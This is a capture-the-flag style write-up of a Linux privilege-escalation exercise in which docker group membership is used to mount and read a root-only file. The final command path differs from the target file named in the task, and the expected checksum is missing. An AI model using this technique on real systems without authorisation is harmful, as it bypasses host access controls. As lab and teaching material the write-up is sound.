## "Annapurna": High privileges

### Problem

Description: You are logged in as the user admin .

You have been tasked with auditing the admin user privileges in this server; "admin" should not have sudo (root) access.

Exploit this server so you as the admin user can read the file /root/secret.txt
Save the content of /root/secret.txt to the file /home/admin/mysolution.txt , for example: echo "secret" > ~/mysolution.txt

Root (sudo) Access: False

Test: Running md5sum /home/admin/mysolution.txt returns . (We also accept the md5sum of the same file without a newline at the end).

### Solution

#### 1. check sudo permissions

We can elevate its root access if we have the admin password.

```
admin@i-05b3bee998a4a6d6c:~$ sudo -l
Matching Defaults entries for admin on i-05b3bee998a4a6d6c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User admin may run the following commands on i-05b3bee998a4a6d6c:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /sbin/shutdown
```

#### 2. check who can access /root directory

Only `root` user can access /root directory.

```
drwx------   3 root root       4096 Dec  7 14:49 root
```

#### 3. check group membership

Admin is in the docker group.

```
admin@i-05b3bee998a4a6d6c:~$ groups admin
admin : admin adm dialout cdrom floppy sudo audio dip video plugdev docker
```

Docker daemon runs as root.

```
admin@i-05b3bee998a4a6d6c:~$ ps -aux | grep docker
root         851  0.3 16.0 1897256 73208 ?       Ssl  10:37   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
admin       1136  0.0  0.4   4072  2052 pts/0    S<+  10:39   0:00 grep docker
```

#### 4. Run a Docker container that mounts the target file and reads it

Co-Pilot: Grok Expert Mode
Why this work:

* Docker group membership allows non-root users to control the Docker daemon, which runs as root.
* Mounting host files/folders gives the container root-level access to them, bypassing host permissions.

```
docker run --rm -v /root/mysecret.txt:/tmp/secret.txt alpine cat /tmp/secret.txt
```
